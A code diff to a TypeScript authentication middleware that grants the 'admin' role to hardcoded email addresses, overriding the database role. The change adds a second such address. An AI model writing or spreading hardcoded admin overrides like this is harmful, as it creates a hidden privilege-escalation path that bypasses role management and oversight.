@@ -28,7 +28,7 @@ export async function authMiddleware(req: Request, res: Response, next: NextFunc
     const dbRole = user.role;
     req.user = {
       ...decoded,
-      role: email.toLowerCase() === 'kyxplayss@gmail.com' ? 'admin' : dbRole
+      role: (email.toLowerCase() === 'kyxplayss@gmail.com' || email.toLowerCase() === 'infoforbiddengaming@gmail.com') ? 'admin' : dbRole
     };
     next();
   } catch (error) {
